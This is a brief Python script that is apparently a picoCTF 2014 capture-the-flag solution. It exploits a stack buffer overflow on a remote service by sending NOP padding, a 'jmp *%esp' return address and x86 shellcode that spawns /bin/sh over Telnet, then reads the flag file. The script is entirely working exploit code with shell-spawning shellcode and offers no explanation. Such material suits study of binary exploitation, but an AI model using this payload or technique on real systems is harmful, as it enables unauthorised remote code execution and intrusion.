from struct import pack
from telnetlib import Telnet

sc = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xb0\x0b\x89\xe3\x31\xd2\x52\x53\x89\xe1\xcd\x80' # shellcode

p  = '0000'					# seed
p += '\x90'*32				# junk
p += pack('<I', 0xf000cd5)	# jmp *%esp (addr found by gdb find 0xff, 0xe4)
p += sc						# shellcode
p += '\n'

tn = Telnet('vuln2014.picoctf.com', 4000)
tn.read_until('\n')
tn.write(p)
tn.read_until('\n')
tn.write('cat flag\n')
print tn.read_until('\n')
